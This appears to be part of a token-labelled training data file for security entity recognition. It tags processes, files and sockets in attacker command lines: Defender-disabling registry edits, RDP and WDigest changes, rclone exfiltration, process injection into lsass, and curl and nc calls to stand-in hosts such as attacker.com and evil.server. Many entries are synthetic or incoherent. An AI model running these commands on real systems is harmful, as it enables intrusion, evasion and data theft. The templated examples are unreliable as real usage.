+C:\ProgramData\updater.exe B-File
+
+python.exe B-Process
+rm B-Process
+C:\Users\Public\runme.bat B-File
+
+python.exe B-Process
+rm B-Process
+C:\Windows\Temp\evil.dll B-File
+
+python.exe B-Process
+runas O
+/user:admin O
+powershell.exe B-Process
+
+python.exe B-Process
+runas O
+/user:admin O
+python.exe B-Process
+
+python.exe B-Process
+runas O
+/user:admin O
+svchost.exe B-Process
+
+python.exe B-Process
+runas O
+/user:admin O
+wmic.exe B-Process
+
+python.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+10.10.10.10:4444 B-Socket
+
+python.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+https://evil.server/payload B-Socket
+
+python.exe B-Process
+taskkill B-Process
+/IM O
+explorer.exe B-Process
+/F O
+
+python.exe B-Process
+taskkill B-Process
+/IM O
+lsass.exe B-Process
+/F O
+
+python.exe B-Process
+taskkill B-Process
+/IM O
+notepad.exe B-Process
+/F O
+
+python.exe B-Process
+taskkill B-Process
+/IM O
+svchost.exe B-Process
+/F O
+
+python.exe B-Process
+taskkill B-Process
+/IM O
+taskmgr.exe B-Process
+/F O
+
+python.exe B-Process
+taskkill B-Process
+/IM O
+winlogon.exe B-Process
+/F O
+
+python_17.exe B-Process
+-c O
+"open('C:\\temp\\pw_17.txt').read()" B-File
+
+python_24.exe B-Process
+-c O
+"open('C:\\Users\\admin\\payload_24.exe', B-File
+'wb').write(b'\x90\x90\x90')" O
+
+python_27.exe B-Process
+-c O
+"open('C:\\temp\\pw_27.txt').read()" B-File
+
+python_30.exe B-Process
+-c O
+"open('C:\\Users\\admin\\payload_30.exe', B-File
+'wb').write(b'\x90\x90\x90')" O
+
+python_31.exe B-Process
+-c O
+"open('C:\\Users\\admin\\payload_31.exe', B-File
+'wb').write(b'\x90\x90\x90')" O
+
+python_38.exe B-Process
+-c O
+"open('C:\\temp\\pw_38.txt').read()" B-File
+
+python_39.exe B-Process
+-c O
+"open('C:\\Users\\admin\\payload_39.exe', B-File
+'wb').write(b'\x90\x90\x90')" O
+
+python_42.exe B-Process
+-c O
+"open('C:\\Users\\admin\\payload_42.exe', B-File
+'wb').write(b'\x90\x90\x90')" O
+
+python_44.exe B-Process
+-c O
+"open('C:\\Users\\admin\\payload_44.exe', B-File
+'wb').write(b'\x90\x90\x90')" O
+
+python_54.exe B-Process
+-c O
+"open('C:\\temp\\pw_54.txt').read()" B-File
+
+python_56.exe B-Process
+-c O
+"open('C:\\Users\\admin\\payload_56.exe', B-File
+'wb').write(b'\x90\x90\x90')" O
+
+python_59.exe B-Process
+-c O
+"open('C:\\Users\\admin\\payload_59.exe', B-File
+'wb').write(b'\x90\x90\x90')" O
+
+python_77.exe B-Process
+-c O
+"open('C:\\Users\\admin\\payload_77.exe', B-File
+'wb').write(b'\x90\x90\x90')" O
+
+python_8.exe B-Process
+-c O
+"open('C:\\temp\\pw_8.txt').read()" B-File
+
+python_82.exe B-Process
+-c O
+"open('C:\\temp\\pw_82.txt').read()" B-File
+
+python_86.exe B-Process
+-c O
+"open('C:\\temp\\pw_86.txt').read()" B-File
+
+qq.exe B-Process
+-gcb O
+-sc O
+trustdmp B-File
+
+qq.exe B-Process
+-subnets O
+-f O
+(objectCategory=subnet) O
+
+rclone.exe, B-Process
+copy,
+\\REDACTED\Shares, B-Socket
+mega:Shares, B-Socket
+-q,
+--ignore-existing,
+--auto-confirm,
+--multi-thread-streams,
+4,
+--transfers,
+4
+
+reg B-Process
+add O
+"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" B-File
+/v O
+AutoAdminLogon O
+/t O
+REG_SZ O
+/d O
+1 O
+/f O
+
+reg B-Process
+add O
+"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" B-File
+/v O
+DefaultPassword O
+/t O
+REG_SZ O
+/d O
+JapanNight!128 O
+/f O
+
+reg B-Process
+add O
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce B-File
+/v O
+*a O
+/t O
+REG_SZ O
+/d O
+"cmd.exe B-Process
+/c O
+C:\<REDACTED-COMPANY-NAME>.exe" B-Process
+/f O
+
+reg B-Process
+add O
+"HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" B-File
+/v O
+LocalAccountTokenFilterPolicy O
+/t O
+REG\_DWORD O
+/d O
+1 O
+/f O
+
+reg B-Process
+add O
+"HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server" I-File
+/v O
+fDenyTSConnections O
+/t O
+REG\_DWORD O
+/d O
+0 O
+/f O
+
+reg B-Process
+add O
+"HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server\WinStations\RDP-TCP" I-File
+/v O
+UserAuthentication O
+/t O
+REG\_DWORD O
+/d O
+"0" O
+/f O
+
+reg B-Process
+add O
+"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" B-File
+/v O
+LocalAccountTokenFilterPolicy O
+/t O
+REG_DWORD O
+/d O
+1 O
+/f O
+
+reg B-Process
+add O
+"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server" I-File
+/v O
+fDenyTSConnections O
+/t O
+REG_DWORD O
+/d O
+0 O
+/f O
+
+reg B-Process
+add O
+"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal B-File
+Server\WinStations\RDP-TCP" I-File
+/v O
+UserAuthentication O
+/t O
+REG_DWORD O
+/d O
+"0" O
+/f O
+
+reg B-Process
+add O
+"HKLM\SYSTEM\CurrrentControlSet\Control\Terminal B-File
+Server" I-File
+/f O
+/v O
+fDenyTSConnections O
+/t O
+REG_DWORD O
+/d O
+0 O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender" I-File
+/v O
+"DisableAntiSpyware" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender" I-File
+/v O
+"DisableAntiVirus" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\MpEngine" I-File
+/v O
+"MpEnablePus" O
+/t O
+REG_DWORD O
+/d O
+"0" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\Real-Time I-File
+Protection" I-File
+/v O
+"DisableBehaviorMonitoring" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\Real-Time I-File
+Protection" I-File
+/v O
+"DisableIOAVProtection" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\Real-Time I-File
+Protection" I-File
+/v O
+"DisableOnAccessProtection" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\Real-Time I-File
+Protection" I-File
+/v O
+"DisableRealtimeMonitoring" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\Real-Time I-File
+Protection" I-File
+/v O
+"DisableScanOnRealtimeEnable" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\Reporting" I-File
+/v O
+"DisableEnhancedNotifications" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\SpyNet" I-File
+/v O
+"DisableBlockAtFirstSeen" O
+/t O
+REG_DWORD O
+/d O
+"1" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\SpyNet" I-File
+/v O
+"SpynetReporting" O
+/t O
+REG_DWORD O
+/d O
+"0" O
+/f O
+
+reg B-Process
+add O
+"HKLM\Software\Policies\Microsoft\Windows B-File
+Defender\SpyNet" I-File
+/v O
+"SubmitSamplesConsent" O
+/t O
+REG_DWORD O
+/d O
+"0" O
+/f O
+
+reg B-Process
+add O
+HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest B-File
+/v O
+UseLogonCredential O
+/t O
+REG\_DWORD O
+/d O
+1 O
+/f O
+
+reg B-Process
+add O
+HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest B-File
+/v O
+UseLogonCredential O
+/t O
+REG_DWORD O
+/d O
+1 O
+/f O
+
+reg B-Process
+add O
+HKLM\SYSTEM\CurrrentControlSet\Control\Terminal B-File
+Server I-File
+/f O
+/v O
+fDenyTSConnections O
+/t O
+REG_DWORD O
+/d O
+0
+
+reg B-Process
+add O
+\"HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\" I-File
+/t O
+REG_DWORD O
+/f O
+/d O
+0 O
+/v O
+Support\" O
+
+reg B-Process
+query O
+hkcu\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall B-File
+/v O
+"DisplayName" O
+/s O
+
+reg.exe B-Process
+ADD O
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System B-File
+/v O
+EnableLUA O
+/t O
+REG_DWORD O
+/d O
+0 O
+/f O
+
+reg_1.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_12.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_14.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_20.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_23.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_32.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_33.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_40.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_5.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_53.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_60.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_65.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_67.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_77.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_83.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_9.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+reg_93.exe B-Process
+query O
+HKLM\SOFTWARE\Microsoft\Windows B-File
+NT\CurrentVersion I-File
+
+regsvr32 B-Process
+/s O
+/n O
+/i:Action O
+"C:\Users\<user>\AppData\Roaming\Microsoft\20350.dll" B-File
+
+regsvr32 B-Process
+/s O
+/n O
+/i\:Action O
+"C:\Users\<user>\AppData\Roaming\Microsoft\20350.dll" B-File
+
+regsvr32.exe B-Process
+/s O
+/n O
+/i O
+"C:\ProgramData\31765.ocx" B-File
+
+rundll32 B-Process
+C:\PerfLogs\socks64.dll, B-File
+rundll O
+
+rundll32 B-Process
+C:\\PerfLogs\\socks64.dll, B-File
+rundll
+
+rundll32.exe B-Process
+c:\programdata\payload_cr1.dll,DllInstall B-File
+
+rundll32.exe B-Process
+"C:\Users\USERNAME\AppData\Local\Temp\skull-x64.dat",update B-File
+/i:"DwarfWing\license.dat" B-File
+
+rundll32.exe B-Process
+-Command O
+"Start-Process B-O
+/tmp/malware.sh" B-File
+
+rundll32.exe B-Process
+-exec O
+/tmp/malware.sh B-File
+
+rundll32.exe B-Process
+-exec O
+/usr/local/bin/backdoor B-File
+
+rundll32.exe B-Process
+-exec O
+C:\ProgramData\updater.exe B-File
+
+rundll32.exe B-Process
+-exec O
+C:\Users\Public\runme.bat B-File
+
+rundll32.exe B-Process
+/c O
+start O
+/tmp/malware.sh B-File
+
+rundll32.exe B-Process
+/c O
+start O
+C:\ProgramData\updater.exe B-File
+
+rundll32.exe B-Process
+/c O
+start O
+C:\Users\Public\runme.bat B-File
+
+rundll32.exe B-Process
+/c O
+start O
+C:\Windows\Temp\evil.dll B-File
+
+rundll32.exe B-Process
+/c O
+start O
+powershell.exe B-Process
+
+rundll32.exe B-Process
+/c O
+start O
+python.exe B-Process
+
+rundll32.exe B-Process
+/c O
+start O
+rundll32.exe B-Process
+
+rundll32.exe B-Process
+C:\Users\redacted\AppData\Local\Temp\wsuC3C.tmp,ControlUnitSpeed B-File
+
+rundll32.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+lsass.exe B-Process
+
+rundll32.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+svchost.exe B-Process
+
+rundll32.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+taskmgr.exe B-Process
+
+rundll32.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+winlogon.exe B-Process
+
+rundll32.exe B-Process
+Invoke-WebRequest O
+-Uri O
+10.10.10.10:4444 B-Socket
+-Method O
+POST O
+
+rundll32.exe B-Process
+Invoke-WebRequest O
+-Uri O
+192.168.1.100:8080 B-Socket
+-Method O
+POST O
+
+rundll32.exe B-Process
+Invoke-WebRequest O
+-Uri O
+https://evil.server/payload B-Socket
+-Method O
+POST O
+
+rundll32.exe B-Process
+Remove-Item O
+/usr/local/bin/backdoor B-File
+-Force O
+
+rundll32.exe B-Process
+Remove-Item O
+C:\ProgramData\updater.exe B-File
+-Force O
+
+rundll32.exe B-Process
+Remove-Item O
+C:\Users\Public\runme.bat B-File
+-Force O
+
+rundll32.exe B-Process
+Remove-Item O
+C:\Windows\Temp\evil.dll B-File
+-Force O
+
+rundll32.exe B-Process
+Set-ProcessInjection O
+-Target O
+explorer.exe B-Process
+
+rundll32.exe B-Process
+Set-ProcessInjection O
+-Target O
+notepad.exe B-Process
+
+rundll32.exe B-Process
+Set-ProcessInjection O
+-Target O
+taskmgr.exe B-Process
+
+rundll32.exe B-Process
+Stop-Process O
+-Name O
+explorer.exe B-Process
+-Force O
+
+rundll32.exe B-Process
+Stop-Process O
+-Name O
+notepad.exe B-Process
+-Force O
+
+rundll32.exe B-Process
+Stop-Process O
+-Name O
+svchost.exe B-Process
+-Force O
+
+rundll32.exe B-Process
+Stop-Process O
+-Name O
+taskmgr.exe B-Process
+-Force O
+
+rundll32.exe B-Process
+attrib B-Process
++s O
++h O
+/var/tmp/hide.so B-File
+
+rundll32.exe B-Process
+attrib B-Process
++s O
++h O
+C:\ProgramData\updater.exe B-File
+
+rundll32.exe B-Process
+attrib B-Process
++s O
++h O
+C:\Users\Public\runme.bat B-File
+
+rundll32.exe B-Process
+attrib B-Process
++s O
++h O
+C:\Windows\Temp\evil.dll B-File
+
+rundll32.exe B-Process
+c:\programdata\payload_cr1.dll,DllInstall B-File
+
+rundll32.exe B-Process
+chmod B-Process
+777 O
+/tmp/malware.sh B-File
+
+rundll32.exe B-Process
+chmod B-Process
+777 O
+/usr/local/bin/backdoor B-File
+
+rundll32.exe B-Process
+chmod B-Process
+777 O
+/var/tmp/hide.so B-File
+
+rundll32.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+10.10.10.10:4444 B-Socket
+
+rundll32.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+192.168.1.100:8080 B-Socket
+
+rundll32.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+http://attacker.com/c2 B-Socket
+
+rundll32.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+https://evil.server/payload B-Socket
+
+rundll32.exe B-Process
+del B-Process
+/tmp/malware.sh B-File
+
+rundll32.exe B-Process
+del B-Process
+C:\ProgramData\updater.exe B-File
+
+rundll32.exe B-Process
+del B-Process
+C:\Windows\Temp\evil.dll B-File
+
+rundll32.exe B-Process
+dllinjector.exe B-Process
+-p O
+explorer.exe B-Process
+-d O
+payload.dll B-File
+
+rundll32.exe B-Process
+dllinjector.exe B-Process
+-p O
+lsass.exe B-Process
+-d O
+payload.dll B-File
+
+rundll32.exe B-Process
+dllinjector.exe B-Process
+-p O
+notepad.exe B-Process
+-d O
+payload.dll B-File
+
+rundll32.exe B-Process
+dllinjector.exe B-Process
+-p O
+taskmgr.exe B-Process
+-d O
+payload.dll B-File
+
+rundll32.exe B-Process
+dllinjector.exe B-Process
+-p O
+winlogon.exe B-Process
+-d O
+payload.dll B-File
+
+rundll32.exe B-Process
+icacls B-Process
+/tmp/malware.sh B-File
+/grant O
+Everyone:F O
+
+rundll32.exe B-Process
+icacls B-Process
+/usr/local/bin/backdoor B-File
+/grant O
+Everyone:F O
+
+rundll32.exe B-Process
+icacls B-Process
+/var/tmp/hide.so B-File
+/grant O
+Everyone:F O
+
+rundll32.exe B-Process
+kill O
+$(Get-Process O
+explorer.exe.Id) B-Process
+
+rundll32.exe B-Process
+kill O
+$(Get-Process O
+svchost.exe.Id) B-Process
+
+rundll32.exe B-Process
+kill O
+$(Get-Process O
+taskmgr.exe.Id) B-Process
+
+rundll32.exe B-Process
+kill O
+$(Get-Process O
+winlogon.exe.Id) B-Process
+
+rundll32.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+10.10.10.10:4444 B-Socket
+
+rundll32.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+192.168.1.100:8080 B-Socket
+
+rundll32.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+http://attacker.com/c2 B-Socket
+
+rundll32.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+https://evil.server/payload B-Socket
+
+rundll32.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+10.10.10.10:4444 B-Socket
+-Body O
+'cmd=whoami'" O
+
+rundll32.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+192.168.1.100:8080 B-Socket
+-Body O
+'cmd=whoami'" O
+
+rundll32.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+http://attacker.com/c2 B-Socket
+-Body O
+'cmd=whoami'" O
+
+rundll32.exe B-Process
+powershell B-Process
+-c O
+"Invoke-RestMethod O
+-Uri O
+https://evil.server/payload B-Socket
+-Body O
+'cmd=whoami'" O
+
+rundll32.exe B-Process
+powershell B-Process
+Start-Process O
+cmd.exe B-Process
+
+rundll32.exe B-Process
+powershell B-Process
+Start-Process O
+powershell.exe B-Process
+
+rundll32.exe B-Process
+powershell B-Process
+Start-Process O
+python.exe B-Process
+
+rundll32.exe B-Process
+powershell B-Process
+Start-Process O
+rundll32.exe B-Process
+
+rundll32.exe B-Process
+powershell B-Process
+Start-Process O
+svchost.exe B-Process
+
+rundll32.exe B-Process
+powershell B-Process
+Start-Process O
+wmic.exe B-Process
+
+rundll32.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+10.10.10.10:4444 B-Socket
+
+rundll32.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+192.168.1.100:8080 B-Socket
+
+rundll32.exe B-Process
+python3 B-Process
+-m O
+http.server B-Socket
+8080 I-Socket
+--bind O
+https://evil.server/payload B-Socket
+
+rundll32.exe B-Process
+rm B-Process
+/tmp/malware.sh B-File
+
+rundll32.exe B-Process
+rm B-Process
+C:\Users\Public\runme.bat B-File
+
+rundll32.exe B-Process
+runas O
+/user:admin O
+cmd.exe B-Process
+
+rundll32.exe B-Process
+runas O
+/user:admin O
+rundll32.exe B-Process
+
+rundll32.exe B-Process
+runas O
+/user:admin O
+svchost.exe B-Process
+
+rundll32.exe B-Process
+runas O
+/user:admin O
+wmic.exe B-Process
+
+rundll32.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+http://attacker.com/c2 B-Socket
+
+rundll32.exe B-Process
+socat B-Process
+TCP4-LISTEN:8080,fork B-Socket
+https://evil.server/payload B-Socket
+
+rundll32.exe B-Process
+taskkill B-Process
+/IM O
+explorer.exe B-Process
+/F O
+
+rundll32.exe B-Process
+taskkill B-Process
+/IM O
+lsass.exe B-Process
+/F O
+
+rundll32.exe B-Process
+taskkill B-Process
+/IM O
+notepad.exe B-Process
+/F O
+
+rundll32.exe B-Process
+taskkill B-Process
+/IM O
+taskmgr.exe B-Process
+/F O
+
+rundll32_38.exe B-Process
+shell32.dll,Control_RunDLL B-File
+C:\Temp\config.ini B-File
+
+rundll32_43.exe B-Process
+shell32.dll,Control_RunDLL B-File
+C:\Temp\config.ini B-File
+
+rundll32_46.exe B-Process
+shell32.dll,Control_RunDLL B-File
+C:\Temp\config.ini B-File
+
+rundll32_50.exe B-Process
+shell32.dll,Control_RunDLL B-File
+C:\Temp\config.ini B-File
+
+rundll32_78.exe B-Process
+shell32.dll,Control_RunDLL B-File
+C:\Temp\config.ini B-File
+
+rundll32_83.exe B-Process
+shell32.dll,Control_RunDLL B-File
+C:\Temp\config.ini B-File
+
+rundll32_99.exe B-Process
+shell32.dll,Control_RunDLL B-File
+C:\Temp\config.iniprocess-file-exec(e1,e2) B-File
+
+sc B-Process
+config O
+"Netbackup B-Process
+Legacy I-Process
+Network I-Process
+service" I-Process
+start= O
+disabled O
+
+sc B-Process
+config O
+MSExchangeDelivery B-Process
+start= O
+disabled O
+
+sc B-Process
+config O
+MSExchangeDiagnostics B-Process
+start= O
+disabled O
+
+schtasks B-Process
+/Create O
+/TN O
+"8766714F94DD" O
+/XML O
+"C:\ProgramData\Microsoft\51D7701F6EB775C7.txt" B-File
+
+schtasks B-Process
+/create O
+/F O
+/sc O
+minute O
+/mo O
+1 O
+/tn O
+"BrowserUpdate" B-Process
+/tr O
+"$dst" O
+
+schtasks B-Process
+/create O
+/tn O
+ngm O
+/tr O
+"%~dps0kit.bat B-File
+-s" O
+/sc O
+hourly O
+/ru O
+"" O
+
+schtasks B-Process
+/delete O
+/tn O
+"\Microsoft\Windows\Windows B-File
+Defender\Windows I-File
+Defender I-File
+Cache I-File
+Maintenance" I-File
+/f O
+
+schtasks B-Process
+/delete O
+/tn O
+"\Microsoft\Windows\Windows B-File
+Defender\Windows I-File
+Defender I-File
+Cleanup" I-File
+/f O
+
+schtasks B-Process
+/delete O
+/tn O
+"\Microsoft\Windows\Windows B-File
+Defender\Windows I-File
+Defender I-File
+Scheduled I-File
+Scan" I-File
+/f O
+
+schtasks B-Process
+/delete O
+/tn O
+"\Microsoft\Windows\Windows B-File
+Defender\Windows I-File
+Defender I-File
+Verification" I-File
+/f O
+
+schtasks.exe B-Process
+/Run O
+/tn O
+'\Microsoft\Windows\Maintenance\Wininet' B-File
+
+svchost.exe B-Process
+--config O
+svchost.conf B-File
+--progress O
+--no-check-certificate O
+copy O
+"\\ServerName\C$\ShareName" B-File
+ftp1:/DomainName/FILES/C/ShareName B-Socket
+
+svchost.exe B-Process
+-Command O
+"Start-Process O
+C:\Users\Public\runme.bat" B-File
+
+svchost.exe B-Process
+-exec O
+/tmp/malware.sh B-File
+
+svchost.exe B-Process
+-exec O
+/usr/local/bin/backdoor B-File
+
+svchost.exe B-Process
+-exec O
+/var/tmp/hide.so B-File
+
+svchost.exe B-Process
+-exec O
+C:\Users\Public\runme.bat B-File
+
+svchost.exe B-Process
+/c O
+start O
+/usr/local/bin/backdoor B-File
+
+svchost.exe B-Process
+/c O
+start O
+C:\Windows\Temp\evil.dll B-File
+
+svchost.exe B-Process
+/c O
+start O
+cmd.exe B-Process
+
+svchost.exe B-Process
+/c O
+start O
+powershell.exe B-Process
+
+svchost.exe B-Process
+/c O
+start O
+python.exe B-Process
+
+svchost.exe B-Process
+/c O
+start O
+rundll32.exe B-Process
+
+svchost.exe B-Process
+/c O
+start O
+svchost.exe B-Process
+
+svchost.exe B-Process
+/c O
+start O
+wmic.exe B-Process
+
+svchost.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+explorer.exe B-Process
+
+svchost.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+svchost.exe B-Process
+
+svchost.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+taskmgr.exe B-Process
+
+svchost.exe B-Process
+Invoke-ReflectivePEInjection O
+-PEPath O
+winlogon.exe B-Process
+
+svchost.exe B-Process
+Invoke-WebRequest O
+-Uri O
+192.168.1.100:8080 B-Socket
+-Method O
+POST O
+
+svchost.exe B-Process
+Invoke-WebRequest O
+-Uri O
+http://attacker.com/c2 B-Socket
+-Method O
+POST O
+
+svchost.exe B-Process
+Invoke-WebRequest O
+-Uri O
+https://evil.server/payload B-Socket
+-Method O
+POST O
+
+svchost.exe B-Process
+Remove-Item O
+/tmp/malware.sh B-File
+-Force O
+
+svchost.exe B-Process
+Remove-Item O
+/usr/local/bin/backdoor B-File
+-Force O
+
+svchost.exe B-Process
+Remove-Item O
+/var/tmp/hide.so B-File
+-Force O
+
+svchost.exe B-Process
+Remove-Item O
+C:\ProgramData\updater.exe B-File
+-Force O
+
+svchost.exe B-Process
+Remove-Item O
+C:\Windows\Temp\evil.dll B-File
+-Force O
+
+svchost.exe B-Process
+Set-ProcessInjection O
+-Target O
+lsass.exe B-Process
+
+svchost.exe B-Process
+Set-ProcessInjection O
+-Target O
+notepad.exe B-Process
+
+svchost.exe B-Process
+Set-ProcessInjection O
+-Target O
+taskmgr.exe B-Process
+
+svchost.exe B-Process
+Set-ProcessInjection O
+-Target O
+winlogon.exe B-Process
+
+svchost.exe B-Process
+Stop-Process O
+-Name O
+lsass.exe B-Process
+-Force O
+
+svchost.exe B-Process
+Stop-Process O
+-Name O
+taskmgr.exe B-Process
+-Force O
+
+svchost.exe B-Process
+Stop-Process O
+-Name O
+winlogon.exe B-Process
+-Force O
+
+svchost.exe B-Process
+attrib B-Process
++s O
++h O
+/tmp/malware.sh B-File
+
+svchost.exe B-Process
+attrib B-Process
++s O
++h O
+/usr/local/bin/backdoor B-File
+
+svchost.exe B-Process
+attrib B-Process
++s O
++h O
+/var/tmp/hide.so B-File
+
+svchost.exe B-Process
+attrib B-Process
++s O
++h O
+C:\Windows\Temp\evil.dll B-File
+
+svchost.exe B-Process
+chmod B-Process
+777 O
+/tmp/malware.sh B-File
+
+svchost.exe B-Process
+chmod B-Process
+777 O
+/usr/local/bin/backdoor B-File
+
+svchost.exe B-Process
+chmod B-Process
+777 O
+/var/tmp/hide.so B-File
+
+svchost.exe B-Process
+chmod B-Process
+777 O
+C:\ProgramData\updater.exe B-File
+
+svchost.exe B-Process
+chmod B-Process
+777 O
+C:\Windows\Temp\evil.dll B-File
+
+svchost.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+10.10.10.10:4444 B-Socket
+
+svchost.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+192.168.1.100:8080 B-Socket
+
+svchost.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+http://attacker.com/c2 B-Socket
+
+svchost.exe B-Process
+curl B-Process
+-X O
+POST O
+--data O
+'ping' O
+https://evil.server/payload B-Socket
+
+svchost.exe B-Process
+del B-Process
+/usr/local/bin/backdoor B-File
+
+svchost.exe B-Process
+del B-Process
+/var/tmp/hide.so B-File
+
+svchost.exe B-Process
+del B-Process
+C:\Users\Public\runme.bat B-File
+
+svchost.exe B-Process
+del B-Process
+C:\Windows\Temp\evil.dll B-File
+
+svchost.exe B-Process
+dllinjector.exe B-Process
+-p O
+explorer.exe B-Process
+-d O
+payload.dll B-File
+
+svchost.exe B-Process
+dllinjector.exe B-Process
+-p O
+notepad.exe B-Process
+-d O
+payload.dll B-File
+
+svchost.exe B-Process
+dllinjector.exe B-Process
+-p O
+svchost.exe B-Process
+-d O
+payload.dll B-File
+
+svchost.exe B-Process
+dllinjector.exe B-Process
+-p O
+winlogon.exe B-Process
+-d O
+payload.dll B-File
+
+svchost.exe B-Process
+icacls B-Process
+/tmp/malware.sh B-File
+/grant O
+Everyone:F O
+
+svchost.exe B-Process
+icacls B-Process
+C:\Users\Public\runme.bat B-File
+/grant O
+Everyone:F O
+
+svchost.exe B-Process
+icacls B-Process
+C:\Windows\Temp\evil.dll B-File
+/grant O
+Everyone:F O
+
+svchost.exe B-Process
+kill O
+$(Get-Process O
+lsass.exe.Id) B-Process
+
+svchost.exe B-Process
+kill O
+$(Get-Process O
+taskmgr.exe.Id) B-Process
+
+svchost.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+10.10.10.10:4444 B-Socket
+
+svchost.exe B-Process
+nc B-Process
+-lvp O
+4444 O
+-s O
+192.168.1.100:8080 B-Socket
+
+svchost.exe B-Process
